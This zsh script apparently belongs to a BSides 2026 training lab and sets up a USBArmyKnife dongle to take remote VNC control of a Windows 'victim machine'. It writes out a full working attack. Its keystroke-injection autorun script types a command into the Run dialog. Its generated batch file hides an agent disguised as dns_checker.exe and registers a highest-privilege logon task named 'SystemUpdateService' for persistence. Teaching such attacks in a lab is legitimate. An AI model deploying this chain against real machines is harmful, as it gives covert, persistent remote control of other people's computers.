#!/bin/zsh

# ==============================================================================
# BSides 2026: USBArmyKnife Station Setup (macOS)
# Usage: ./mac-vnc-setup.sh [command]
# Commands:
#   setup       : Start full setup (Download to USB/SD -> Wait for Windows -> Build -> Format Micro-SD)
#   resume      : Resume after Windows compilation (Build -> Format Micro-SD)
#   reset       : Reset station (Eject drive, clear temp files)
#   help        : Show help
# ==============================================================================

set -e

# --- Configuration ---
REPO_OWNER="i-am-shodan"
REPO_NAME="USBArmyKnife"
FIRMWARE_WORKFLOW="main.yml"
FIRMWARE_ARTIFACT="LILYGO-T-Dongle-S3 Firmware binaries"
BOOT_APP0_URL="https://raw.githubusercontent.com/espressif/arduino-esp32/master/tools/partitions/boot_app0.bin"
RAW_AGENT_URL="https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/master/examples/install_agent_and_run_command/us-autorun.ds"
IMAGE_SIZE_MB=120
IMAGE_NAME="agent.img"
SETUP_DRIVE="SETUPDISK"
LILYGO_DRIVE="AGENTDISK"
VOL_NAME="USBAGENT"

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- Helper Functions ---
log_step()    { printf "\n${BLUE}[STEP]${NC} %s\n\n" "$1"; }
log_success() { printf "\n${GREEN}[OK]${NC} %s\n\n" "$1"; }
log_warn()    { printf "\n${YELLOW}[WARN]${NC} %s\n\n" "$1"; }
log_error()   { printf "\n${RED}[ERR]${NC} %s\n\n" "$1"; exit 1; }

log_banner() {
    printf "\n${CYAN}============================================================${NC}\n"
    printf "${CYAN}  %s${NC}\n" "$1"
    printf "${CYAN}============================================================${NC}\n\n"
}

show_help() {
    echo ""
    echo "Usage: $0 [command]"
    echo ""
    echo "Commands:"
    echo "  $0 setup       : Start full setup. Downloads files to a USB or Micro-SD drive."
    echo "  $0 resume      : Resume after Windows compilation. Builds image and formats a Micro-SD card."
    echo "  $0 reset       : Reset station. Ejects drive, clears temp files."
    echo "  $0 help        : Show this help message."
    echo ""
    echo "Workflow:"
    echo "  1. Run '$0 setup'. Script downloads files to your USB or Micro-SD drive."
    echo "  2. Move drive to Windows machine. Run '.\\Win_Prep.ps1 -Action Compile'."
    echo "  3. Move drive back to Mac. Run '$0 resume'."
    echo "     NOTE: The final step REQUIRES a Micro-SD card to be inserted for the LilyGo."
    echo ""
    exit 0
}

# --- Firmware Download ---
# Downloads the latest successful LILYGO-T-Dongle-S3 firmware artifact from
# the USBArmyKnife main.yml workflow, plus boot_app0.bin from the arduino-esp32
# repo (which is NOT included in the artifact and must be fetched separately).
#
# NOTE: Agent.exe is compiled via AOT (Ahead-of-Time) publishing. This strips
# all .NET IL and metadata headers from the output, producing a native binary.
# As a result, .NET obfuscation tools (including ByteHide and similar) cannot
# be applied — there are no managed headers left to process. The binary is
# already an opaque native executable after AOT compilation.
#
# Required: GitHub CLI (gh) — install via: brew install gh && gh auth login
download_firmware() {
    local dest="$1"
    mkdir -p "$dest"

    # Check for gh CLI
    if ! command -v gh &> /dev/null; then
        log_error "GitHub CLI (gh) not found. Install it with: brew install gh && gh auth login"
    fi

    log_step "Finding latest successful firmware build from ${REPO_OWNER}/${REPO_NAME} (${FIRMWARE_WORKFLOW})..."

    # Get the ID of the most recent successful run on master for main.yml.
    # Query params must be in the URL for GET requests — --field sends a POST
    # body and is silently ignored by gh api on GET endpoints.
    RUN_ID=$(gh api \
        "repos/${REPO_OWNER}/${REPO_NAME}/actions/workflows/${FIRMWARE_WORKFLOW}/runs?branch=master&status=success&per_page=1" \
        --jq '.workflow_runs[0].id')

    if [ -z "$RUN_ID" ] || [ "$RUN_ID" = "null" ]; then
        echo ""
        echo "Debug — raw API response:"
        gh api "repos/${REPO_OWNER}/${REPO_NAME}/actions/workflows/${FIRMWARE_WORKFLOW}/runs?branch=master&status=success&per_page=1" 2>&1 | head -20
        echo ""
        log_error "No successful run found. Check: gh auth status — and confirm ${FIRMWARE_WORKFLOW} exists in the repo."
    fi

    log_success "Found run ID: ${RUN_ID}"

    # Confirm the LILYGO-T-Dongle-S3 artifact exists in this run
    log_step "Checking for '${FIRMWARE_ARTIFACT}' artifact in run ${RUN_ID}..."

    ARTIFACT_NAME=$(gh api \
        "repos/${REPO_OWNER}/${REPO_NAME}/actions/runs/${RUN_ID}/artifacts" \
        --jq ".artifacts[] | select(.name == \"${FIRMWARE_ARTIFACT}\") | .name" 2>/dev/null | head -n 1)

    if [ -z "$ARTIFACT_NAME" ]; then
        # List what IS available to help diagnose
        log_warn "Artifact '${FIRMWARE_ARTIFACT}' not found. Available artifacts in this run:"
        gh api "repos/${REPO_OWNER}/${REPO_NAME}/actions/runs/${RUN_ID}/artifacts" \
            --jq '.artifacts[].name' 2>/dev/null || true
        echo ""
        log_error "Cannot continue without the '${FIRMWARE_ARTIFACT}' artifact. Check the run at: https://github.com/${REPO_OWNER}/${REPO_NAME}/actions/runs/${RUN_ID}"
    fi

    log_success "Found artifact: ${ARTIFACT_NAME}"

    # Download and unzip the firmware artifact into ./firmware
    log_step "Downloading '${FIRMWARE_ARTIFACT}' artifact to ${dest}..."
    gh run download "$RUN_ID" \
        --repo "${REPO_OWNER}/${REPO_NAME}" \
        --name "${FIRMWARE_ARTIFACT}" \
        --dir "$dest"

    log_success "Firmware artifact downloaded."

    # Verify the expected .bin files are present
    log_step "Verifying firmware .bin files..."
    local missing=0
    for f in bootloader.bin partitions.bin; do
        if [ ! -f "${dest}/${f}" ]; then
            log_warn "Expected firmware file not found: ${dest}/${f}"
            missing=1
        fi
    done

    # The main firmware binary name varies — find the largest .bin that isn't
    # bootloader.bin or partitions.bin and treat it as the main firmware
    MAIN_FW=$(find "$dest" -maxdepth 1 -name "*.bin" \
        ! -name "bootloader.bin" \
        ! -name "partitions.bin" \
        ! -name "boot_app0.bin" \
        -exec ls -S {} + 2>/dev/null | head -n 1)

    if [ -z "$MAIN_FW" ]; then
        log_warn "Main firmware .bin not found in artifact. Check artifact contents:"
        ls -lh "$dest"
        missing=1
    else
        log_success "Main firmware binary: $(basename $MAIN_FW)"
    fi

    if [ "$missing" -eq 1 ]; then
        log_error "One or more firmware files are missing. Cannot continue."
    fi

    # Download boot_app0.bin separately — it is NOT in the artifact
    # It comes from the espressif/arduino-esp32 repo
    log_step "Downloading boot_app0.bin from espressif/arduino-esp32..."
    if curl -fsSL -o "${dest}/boot_app0.bin" "$BOOT_APP0_URL"; then
        log_success "Downloaded boot_app0.bin"
    else
        log_error "Failed to download boot_app0.bin from: ${BOOT_APP0_URL}"
    fi

    # Final inventory
    log_success "Firmware folder contents:"
    ls -lh "$dest"
}

# --- 1. Full Setup: Download & Wait ---
do_full_setup() {
    log_banner "PULL SCREEN LAB - FULL SETUP STARTED"
    echo ""
    echo "Requirements:"
    echo ""
    echo "  1. A USB drive OR Micro-SD card (no larger than 32GB) to perform the Windows setup."
    echo "  2. Windows Prep Machine with Win_Prep.ps1 (can also be the victim machine)."
    echo "  3. A Micro-SD card (no larger than 32GB for the final step)."
    echo ""
    echo "See README.md for full instructions."
    echo ""

    # --- FORMAT SETUP DISK ---
    log_step "Preparing Setup Disk..."
    echo ""
    echo "Please insert the Setup Disk and press Enter when ready..."
    echo ""
    read -r _
    echo ""
    echo "Current disks:"
    diskutil list
    echo ""

    SETNUM=""
    SETDEV=""
    while true; do
        printf "Enter the Setup Disk number (e.g., [4] for /dev/disk4) or [r] to refresh list or [s] to skip formatting or [x] to exit: "
        read -r SETNUM
        SETNUM_LOWER=$(echo "$SETNUM" | tr '[:upper:]' '[:lower:]')

        case "$SETNUM_LOWER" in
            x)
                echo ""
                echo "Exiting setup..."
                echo ""
                exit 0
                ;;
            s)
                echo ""
                echo "Skipping formatting. Using existing drive labeled '$SETUP_DRIVE'."
                echo ""
                if [ ! -d "/Volumes/$SETUP_DRIVE" ]; then
                    log_error "Drive not found! Please insert a USB or Micro-SD card and start the setup again."
                fi
                SETDEV="/dev/$(diskutil info /Volumes/$SETUP_DRIVE | grep "Part of Whole" | awk '{print $4}')"
                break
                ;;
            r)
                echo ""
                echo "Refreshing disk list..."
                diskutil list
                echo ""
                continue
                ;;
            *)
                if ! [[ "$SETNUM" =~ ^[0-9]+$ ]]; then
                    echo "Invalid input: '$SETNUM' is not a number. Please try again."
                    continue
                fi
                if [ "$SETNUM" -lt 3 ] || [ "$SETNUM" -gt 9 ]; then
                    echo "Invalid disk number: $SETNUM. Please enter a number between 3 and 9."
                    continue
                fi
                break
                ;;
        esac
        break
    done

    if [ -z "$SETDEV" ]; then
        if [ -z "$SETNUM" ]; then
            SETDEV="/dev/$(diskutil info /Volumes/$SETUP_DRIVE | grep "Part of Whole" | awk '{print $4}')"
        else
            SETDEV="/dev/disk${SETNUM}"
            log_step "Formatting ${SETDEV} as FAT32 (${SETUP_DRIVE})..."
            diskutil unmountDisk $SETDEV 2>/dev/null || true
            diskutil eraseDisk FAT32 $SETUP_DRIVE MBRFormat $SETDEV

            if [ $? -ne 0 ]; then
                log_error "Failed to format Setup Disk. Restart $0 with the same or another disk inserted and mounted."
            fi
        fi
    fi

    # Check for any drive labeled SETUP_DRIVE
    if [ ! -d "/Volumes/$SETUP_DRIVE" ]; then
        log_error "/Volumes/$SETUP_DRIVE not found! Restart $0 after inserting a USB or Micro-SD card formatted as FAT32 and labeled '$SETUP_DRIVE'."
    fi

    STAGING_DIR="/Volumes/$SETUP_DRIVE/_STAGING"
    mkdir -p "$STAGING_DIR"

    # Copy Win_Prep.ps1 to drive
    if [ -f "./Win_Prep.ps1" ]; then
        cp "./Win_Prep.ps1" "/Volumes/$SETUP_DRIVE/"
        log_success "Copied Win_Prep.ps1 to /Volumes/$SETUP_DRIVE."
    else
        log_warning "Win_Prep.ps1 not found in current directory. Please ensure it is present for the Windows step."
    fi

    # Create marker
    touch "$STAGING_DIR/.WAITING_FOR_WINDOWS"

    # Eject $SETUP_DRIVE
    log_step "Ejecting $SETUP_DRIVE..."
    SET_DEV="/dev/$(diskutil info /Volumes/$SETUP_DRIVE | grep "Part of Whole" | awk '{print $4}')"
    diskutil eject "$SET_DEV"
    if [ $? -ne 0 ]; then
        echo "Failed to eject $SETUP_DRIVE. Please eject it then remove it from the computer: diskutil eject $SET_DEV"
    else
        echo ""
    fi
    log_banner "PAUSED: Move to Windows"
    echo ""
    echo "1. $SETUP_DRIVE has been ejected safely."
    echo "2. Insert it into the Windows Prep Machine."
    echo "3. Run: .\\Win_Prep.ps1 -Action Compile"
    echo "4. Wait for it to finish (it will write to the drive)."
    echo "5. Eject the drive and insert back into Mac."
    echo "6. Press Enter to resume setup. If the program exits, run '$0 resume' to continue from the next step."
    echo ""
    echo "IMPORTANT: For the final step, you will need a Micro-SD CARD inserted in the Mac."
    echo ""
    echo "Press Enter when you have completed the Windows step or [x] to exit..."
    echo ""
    read -r INPUT
    INPUT=$(echo "$INPUT" | tr '[:upper:]' '[:lower:]')
    if [ "$INPUT" = "x" ]; then
        echo "Exiting..."
        exit 0
    elif [ -z "$INPUT" ]; then
        do_resume
    else
        echo "Invalid input. Exiting."
        exit 1
    fi
}

# --- 2. Resume: Build & Format ---
do_resume() {
    log_banner "RESUMING SETUP"

    STAGING_DIR="/Volumes/$SETUP_DRIVE/_STAGING"

    echo ""
    echo "Please insert the USB or Micro-SD card labeled '$SETUP_DRIVE' and press Enter when it is mounted..."
    echo ""
    read -r _
    echo ""

    # Check for drive
    if [ ! -d "/Volumes/$SETUP_DRIVE" ]; then
        log_error "Drive not found! Please insert the USB or Micro-SD card labeled '$SETUP_DRIVE'."
    fi

    # Check if Windows step was done
    if [ ! -f "$STAGING_DIR/.WINDOWS_DONE" ]; then
        log_error "Windows compilation not detected! Please run '.\\Win_Prep.ps1 -Action Compile' on Windows first."
    fi

    log_step "Verifying Windows files on $SETUP_DRIVE..."
    if [ ! -f "$STAGING_DIR/dns_checker.exe" ]; then
        log_error "dns_checker.exe not found on $SETUP_DRIVE. Compilation failed?"
    fi
    log_success "Windows files verified."

    # --- PREPARE LOCAL FOLDERS ---
    mkdir -p "./firmware" "./agentroot" "./agentimg"

    # 1. Copy Windows files to ./agentimg
    log_step "Copying agent files to ./agentimg..."
    cp "$STAGING_DIR/dns_checker.exe" "./agentimg/"
    cp "$STAGING_DIR"/*.dll "./agentimg/" 2>/dev/null || true

    # 2. Download Firmware (if missing or incomplete)
    REQUIRED_FW=("bootloader.bin" "partitions.bin" "boot_app0.bin")
    FW_MISSING=0
    for f in "${REQUIRED_FW[@]}"; do
        [ ! -f "./firmware/$f" ] && FW_MISSING=1 && break
    done
    # Also check that at least one main firmware .bin exists
    MAIN_FW=$(find "./firmware" -maxdepth 1 -name "*.bin" \
        ! -name "bootloader.bin" ! -name "partitions.bin" ! -name "boot_app0.bin" \
        2>/dev/null | head -n 1)
    [ -z "$MAIN_FW" ] && FW_MISSING=1

    if [ "$FW_MISSING" -eq 1 ]; then
        log_warn "Firmware files missing or incomplete in ./firmware. Downloading now..."
        download_firmware "./firmware"
    else
        log_success "Firmware files already present in ./firmware. Skipping download."
    fi

    # 3. Verify Firmware Files (post-download)
    log_step "Verifying firmware files..."
    for f in "${REQUIRED_FW[@]}"; do
        if [ ! -f "./firmware/$f" ]; then
            log_error "Missing firmware file: ./firmware/$f"
        fi
    done
    MAIN_FW=$(find "./firmware" -maxdepth 1 -name "*.bin" \
        ! -name "bootloader.bin" ! -name "partitions.bin" ! -name "boot_app0.bin" \
        -exec ls -S {} + 2>/dev/null | head -n 1)
    if [ -z "$MAIN_FW" ]; then
        log_error "Main firmware .bin not found in ./firmware."
    fi
    log_success "All firmware files verified. Main firmware: $(basename $MAIN_FW)"

    # 4. Generate in1.bat if missing
    if [ -f "./agentimg/in1.bat" ]; then
        log_success "in1.bat already exists in ./agentimg. Skipping generation."
    else
        log_step "Generating in1.bat..."
        cat > "./agentimg/in1.bat" <<'EOF'
@echo off
setlocal enabledelayedexpansion

REM --- CONFIGURATION ---
set "SRC_DIR=%~dp0"
set "TARGET_DIR=C:\Users\Public\Documents\.sys_update"
set "EXE_NAME=dns_checker.exe"
set "TASK_NAME=SystemUpdateService"
set "VID=%1"
set "PID=%2"
set "LOG_FILE=%TARGET_DIR%\install.log"
set "SSID_NAME=iPhone14"
set "SSID_PROFILE=iPhone14"

REM --- 1. INITIALIZE LOG ---
echo [INFO] ========================================== > "%LOG_FILE%"
echo [INFO] Starting Attack Sequence at %date% %time% >> "%LOG_FILE%"
echo [INFO] VID=%VID% PID=%PID% >> "%LOG_FILE%"

REM --- 2. WAIT FOR USB MOUNT ---
echo [INFO] Waiting 15 seconds for USB mount... >> "%LOG_FILE%"
timeout /t 15 /nobreak >nul

REM --- 3. ENSURE WIFI CONNECTION (Critical for VNC) ---
echo [INFO] Checking WiFi connection... >> "%LOG_FILE%"
netsh wlan show interfaces >nul 2>&1
if errorlevel 1 (
    echo [ERROR] No WiFi interface found. >> "%LOG_FILE%"
    goto FAIL_EXIT
)

REM Check if connected to our SSID
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /C:"SSID"') do set CURRENT_SSID=%%a
set CURRENT_SSID=!CURRENT_SSID: =!

if "!CURRENT_SSID!" NEQ "!SSID_NAME!" (
    echo [INFO] Not connected to !SSID_NAME!. Connecting... >> "%LOG_FILE%"
    netsh wlan disconnect >nul 2>&1
    timeout /t 2 /nobreak >nul
    netsh wlan connect name=!SSID_PROFILE! ssid=!SSID_NAME! >nul 2>&1
    timeout /t 5 /nobreak >nul
    
    REM Verify connection
    for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /C:"SSID"') do set CURRENT_SSID=%%a
    set CURRENT_SSID=!CURRENT_SSID: =!
    if "!CURRENT_SSID!" NEQ "!SSID_NAME!" (
        echo [WARN] Failed to connect to !SSID_NAME!. Proceeding anyway... >> "%LOG_FILE%"
    ) else (
        echo [SUCCESS] Connected to !SSID_NAME!. >> "%LOG_FILE%"
    )
) else (
    echo [SUCCESS] Already connected to !SSID_NAME!. >> "%LOG_FILE%"
)

REM --- 4. COPY FILES ---
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
echo [INFO] Copying files... >> "%LOG_FILE%"

copy /Y "%SRC_DIR%turbojpeg.dll" "%TARGET_DIR%\" >nul 2>&1
copy /Y "%SRC_DIR%vcruntime140.dll" "%TARGET_DIR%\" >nul 2>&1
copy /Y "%SRC_DIR%%EXE_NAME%" "%TARGET_DIR%\%EXE_NAME%" >nul 2>&1

if not exist "%TARGET_DIR%\%EXE_NAME%" (
    echo [ERROR] Copy failed! >> "%LOG_FILE%"
    goto FAIL_EXIT
)
echo [SUCCESS] Files copied. >> "%LOG_FILE%"

REM --- 5. KILL OLD INSTANCES ---
taskkill /F /IM "%EXE_NAME%" >nul 2>&1
timeout /t 2 /nobreak >nul

REM --- 6. START AGENT ---
echo [INFO] Launching agent... >> "%LOG_FILE%"
cd /d "%TARGET_DIR%"
start /B "" "%EXE_NAME%" vid=%VID% pid=%PID%

REM --- 7. VERIFICATION LOOP (The "Ensure" Step) ---
echo [INFO] Verifying Agent is Running (Max 90s)... >> "%LOG_FILE%"
set "WAIT_COUNT=0"
:VERIFY_LOOP
set /a WAIT_COUNT+=1

REM Check 1: Is the process running?
tasklist /FI "IMAGENAME eq %EXE_NAME%" 2>nul | findstr /I "%EXE_NAME%" >nul
if errorlevel 1 (
    echo [WARN] Process %EXE_NAME% not found (Attempt !WAIT_COUNT!). >> "%LOG_FILE%"
    if !WAIT_COUNT! GTR 45 (
        echo [ERROR] Agent process failed to start. >> "%LOG_FILE%"
        goto FAIL_EXIT
    )
    timeout /t 2 /nobreak >nul
    goto VERIFY_LOOP
)

REM Check 2: Is the marker file created?
if exist "%TARGET_DIR%\agentInstalled" (
    echo [SUCCESS] Agent confirmed running (Marker found)! >> "%LOG_FILE%"
    goto SUCCESS_EXIT
)

REM Check 3: Is the port open? (Optional, harder to check from batch)
REM Just wait for the marker

timeout /t 2 /nobreak >nul
if !WAIT_COUNT! GTR 45 (
    echo [ERROR] Timeout waiting for agentInstalled marker. >> "%LOG_FILE%"
    goto FAIL_EXIT
)
goto VERIFY_LOOP

:SUCCESS_EXIT
echo [INFO] ========================================== >> "%LOG_FILE%"
echo [SUCCESS] ATTACK SUCCESSFUL. Agent is running. >> "%LOG_FILE%"
echo [INFO] ========================================== >> "%LOG_FILE%"

REM --- 8. CREATE PERSISTENCE TASK ---
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
schtasks /Create /TN "%TASK_NAME%" ^
    /TR "\"%TARGET_DIR%\%EXE_NAME%\" vid=%VID% pid=%PID%" ^
    /SC ONLOGON ^
    /RL HIGHEST ^
    /F >nul 2>&1

if errorlevel 1 (
    echo [WARN] Could not create scheduled task. >> "%LOG_FILE%"
) else (
    echo [SUCCESS] Persistence task created. >> "%LOG_FILE%"
)

goto END

:FAIL_EXIT
echo [INFO] ========================================== >> "%LOG_FILE%"
echo [FAILURE] ATTACK FAILED. Check logs above. >> "%LOG_FILE%"
echo [INFO] ========================================== >> "%LOG_FILE%"

:END
exit /b 0
EOF
        log_success "Generated in1.bat"
    fi

    # 5. Download or generate autorun.ds if missing
    if [ ! -f "./agentroot/autorun.ds" ]; then
        log_step "Downloading autorun.ds from GitHub..."
        if curl -fsSL -o "./agentroot/autorun.ds" "$RAW_AGENT_URL"; then
            log_success "Downloaded autorun.ds."
        else
            log_warning "Failed to download autorun.ds from: $RAW_AGENT_URL"
            log_step "Generating autorun.ds..."
            cat > "./agentroot/autorun.ds" <<'EOF'
REM USBArmyKnife VNC Attack - US Keyboard Layout
REM Requires agent.img on the SD card containing:
REM   dns_checker.exe, in1.bat, turbojpeg.dll, vcruntime140.dll

LOG Starting VNC attack script
DEFINE #FILE /agentInstalled

REM Only install if this is the first run on this machine
IF (FILE_EXISTS() == FALSE) THEN
    LOG agentInstalled flag not found - proceeding with install
    LOG Mounting agent disk image
    USB_MOUNT_DISK_READ_ONLY /agent.img

    REM Wait for Windows to enumerate and mount the virtual drive
    WAIT_FOR_USB_STORAGE_ACTIVITY
    DELAY 6000

    REM Close any foreground window that might intercept GUI R
    REM Pressing Escape clears focus from any active window without closing it
    ESCAPE
    DELAY 500

    REM Open Run dialog - retry with a longer lead-in delay so Win+R
    REM registers before STRING fires
    LOG Opening Run dialog
    GUI R
    DELAY 2000

    REM Inject the install command into the Run dialog.
    REM Searches drives D-H for in1.bat and runs it with device VID/PID.
    REM #_VID_ and #_PID_ are injected at runtime by the USBArmyKnife firmware.
    LOG Injecting install command
    STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat call %d:\in1.bat #_VID_ #_PID_
    ENTER

    LOG HID injection complete
    LOG Waiting for file copy and agent launch to complete

    REM Give Windows time to run in1.bat, copy files, and start the agent
    DELAY 3000
    WAIT_FOR_USB_STORAGE_ACTIVITY_TO_STOP
    DELAY 2000

    REM Write the flag file so we skip install on next plug-in
    CREATE_FILE()

    REM Reset drops the USB mass storage device so the virtual drive disappears
    REM and the dongle re-enumerates in serial mode for agent communication
    LOG Resetting to serial mode
    RESET
END_IF

LOG Install block complete - waiting for agent to connect
LOG If agent does not connect within 30s check: Windows Defender protection history

WHILE (AGENT_CONNECTED() == FALSE)
    DELAY 2000
END_WHILE

LOG Agent connected successfully
LOG Starting VNC stream
EOF
        log_success "Generated autorun.ds"
        fi
    else
        log_success "autorun.ds already exists in ./agentroot. Skipping download."
    fi

    # --- EJECT SETUP DRIVE? OR KEEP IT FOR PAYLOAD? ---
    log_step "Finished with $SETUP_DRIVE..."

    DRIVEDO=""
    while true; do
        echo ""
        echo "Please decide what to do with $SETUP_DRIVE:"
        echo ""
        echo "IMPORTANT: Final step requires a MICRO-SD CARD and cannot use a USB drive."
        echo ""
        printf "Enter [e]ject or [k]eep for $SETUP_DRIVE, or [x] to exit: "
        read -r DRIVEDO

        DRIVEDO_LOWER=$(echo "$DRIVEDO" | tr '[:upper:]' '[:lower:]')
        if ! [[ "$DRIVEDO_LOWER" =~ ^[xek]$ ]]; then
            echo ""
            echo "Invalid input: '$DRIVEDO' must be [x] or [e] or [k]. Please try again."
            continue
        fi
        if [ "$DRIVEDO_LOWER" = "x" ]; then
            echo ""
            echo "Exiting setup..."
            exit 0
        elif [ "$DRIVEDO_LOWER" = "e" ]; then
            echo "Ejecting $SETUP_DRIVE..."
            SETUP_DEV="/dev/$(diskutil info /Volumes/$SETUP_DRIVE | grep "Part of Whole" | awk '{print $4}')"
            diskutil eject "$SETUP_DEV"
            if [ $? -ne 0 ]; then
                echo "Failed to eject $SETUP_DRIVE. Please eject it then remove it from the computer: diskutil eject $SETUP_DEV"
            else
                echo "$SETUP_DRIVE ejected. Please remove it from the computer."
            fi
            echo ""
            echo "Press Enter when removed..."
            read -r _
            echo ""
        elif [ "$DRIVEDO_LOWER" = "k" ]; then
            echo "Keeping $SETUP_DRIVE inserted."
        fi
        break
    done

   # --- VALIDATE ALL FOLDERS BEFORE BUILDING ---
    log_step "Final validation of folders..."

    [ ! -f "./agentimg/dns_checker.exe" ] && log_error "Missing ./agentimg/dns_checker.exe"
    [ ! -f "./agentroot/autorun.ds" ]     && log_error "Missing ./agentroot/autorun.ds"
    [ ! -f "./agentimg/in1.bat" ]        && log_error "Missing ./agentimg/in1.bat"
    for f in "${REQUIRED_FW[@]}"; do
        [ ! -f "./firmware/$f" ] && log_error "Missing firmware file: ./firmware/$f"
    done

    log_success "All files validated. Proceeding to build image."

    # --- BUILD AGENT.IMG ---
    LOCAL_BUILD_DIR="./_local_build"
    mkdir -p "$LOCAL_BUILD_DIR"

    cp "./agentroot/autorun.ds" "$LOCAL_BUILD_DIR/"
    cp "./agentimg/in1.bat"    "$LOCAL_BUILD_DIR/"
    cp "./agentimg/dns_checker.exe" "$LOCAL_BUILD_DIR/"
    cp "./agentimg"/*.dll "$LOCAL_BUILD_DIR/" 2>/dev/null || true

    log_step "Creating ${IMAGE_SIZE_MB}MB disk image (agent.img)..."
    cd "$LOCAL_BUILD_DIR"
    rm -f "$IMAGE_NAME"
    dd if=/dev/zero bs=1m count=$IMAGE_SIZE_MB of="$IMAGE_NAME" 2>/dev/null

    log_step "Attaching and partitioning image..."
    DISK=$(hdiutil attach -nomount "$IMAGE_NAME" | awk '{print $1}')
    [ -z "$DISK" ] && log_error "Failed to attach image."

    diskutil partitionDisk $DISK MBR FAT32 AGENTDISK 100%
    sleep 2

    if [ ! -d "/Volumes/AGENTDISK" ]; then
        hdiutil detach $DISK 2>/dev/null || true
        log_error "Failed to mount AGENTDISK volume."
    fi

    log_step "Copying agent files into image..."
    # Copy everything except the image itself
    for f in *; do
        [ "$f" = "$IMAGE_NAME" ] && continue
        cp "$f" /Volumes/AGENTDISK/
    done

    log_step "Ejecting image..."
    hdiutil detach $DISK
    cd - > /dev/null

    # --- FORMAT MICRO-SD CARD ---
    log_step "Preparing Micro-SD card for LilyGo..."
    echo ""
    echo "Please insert the Micro-SD card for the payload and press Enter when ready..."
    echo ""
    echo "WARNING: The next step will ERASE the Micro-SD card."
    echo ""
    echo "CRITICAL: Ensure a MICRO-SD card (not a USB drive) is inserted."
    read -r _
    echo ""
    echo "Current disks:"
    diskutil list
    echo ""

    SDNUM=""
    while true; do
        printf "Enter the disk number for your MICRO-SD card (e.g., [4] for /dev/disk4) or [r] to refresh list or [x] to exit: "
        read -r SDNUM

        SDNUM_LOWER=$(echo "$SDNUM" | tr '[:upper:]' '[:lower:]')
        if [ "$SDNUM_LOWER" = "x" ]; then
            echo "Exiting setup..."
            exit 0
        fi
        if [ "$SDNUM_LOWER" = "r" ]; then
            echo ""
            echo "Refreshing disk list..."
            diskutil list
            echo ""
            continue
        fi
        if ! [[ "$SDNUM" =~ ^[0-9]+$ ]]; then
            echo "Invalid input: '$SDNUM' is not a number. Please try again."
            continue
        fi
        if [ "$SDNUM" -lt 3 ] || [ "$SDNUM" -gt 9 ]; then
            echo "Invalid disk number: $SDNUM. Please enter a number between 3 and 9."
            continue
        fi
        break
    done

    SD_DEV="/dev/disk${SDNUM}"

    log_step "Formatting ${SD_DEV} as FAT32 (${VOL_NAME})..."
    diskutil unmountDisk $SD_DEV 2>/dev/null || true
    diskutil eraseDisk FAT32 $VOL_NAME MBRFormat $SD_DEV

    if [ $? -ne 0 ]; then
        log_error "Failed to format Micro-SD card."
    fi

    log_step "Copying payload to Micro-SD card..."
    sleep 2
    if [ ! -d "/Volumes/$VOL_NAME" ]; then
        log_error "Micro-SD card volume not found after format."
    fi

    cp "$LOCAL_BUILD_DIR/$IMAGE_NAME"   "/Volumes/$VOL_NAME/"
    cp "$LOCAL_BUILD_DIR/autorun.ds"    "/Volumes/$VOL_NAME/"

    log_step "Ejecting Micro-SD card..."

    diskutil eject "$SD_DEV"
    if [ $? -ne 0 ]; then
        log_warn "Failed to eject Micro-SD card. Please eject it then remove it from the computer: diskutil eject $SD_DEV"
    else
        echo ""
    fi

    # Cleanup
    rm -rf "$LOCAL_BUILD_DIR"

    log_banner "SETUP COMPLETE"
    echo "Next Steps:"
    echo "  1. Insert the Micro-SD card into your LilyGo T-Dongle S3."
    echo "  2. Push the button on the back of the LilyGo to enter flashing mode."
    echo "  3. Insert the LilyGo into a USB port while still holding the button"
    echo "  4. Let go of the button after 2 seconds."
    echo "  5. Flash firmware using https://esp.huhn.me/ with files from ./firmware:"
    echo "     Offset 0x0000  -> bootloader.bin"
    echo "     Offset 0x8000  -> partitions.bin"
    echo "     Offset 0xe000  -> boot_app0.bin"
    echo "     Offset 0x10000 -> <main firmware .bin>"
    echo "  6. Unplug LilyGo and plug into Victim Machine (do not push button)."
    echo "  7. Connect a computer or phone to it's WiFi Access Point:"
    echo "     SSID: iphone14"
    echo "     password: password"
    echo "  8. Open http://4.3.2.1:8080"
    echo ""
    echo "For full instructions, see README.md or FACILITATOR.md."
    echo ""
}

# --- 3. Station Reset ---
do_reset() {
    log_banner "STATION RESET"
    log_step "Ejecting any mounted volumes..."
    diskutil eject /dev/disk* 2>/dev/null || true
    log_step "Clearing local temp folders..."
    rm -rf "./_local_build"
    log_success "Station reset. Ready for next user."
    echo ""
    echo "Please re-insert a USB or Micro-SD drive and run '$0 setup'."
    echo ""
    echo "NOTE: On the Windows Victim Machine, run '.\\Win_Prep.ps1 -Action Reset' to clear attack files."
    echo ""
}

# --- Main ---
COMMAND="${1:-setup}"

case "$COMMAND" in
    setup)  do_full_setup ;;
    resume) do_resume     ;;
    reset)  do_reset      ;;
    help|*) show_help     ;;
esac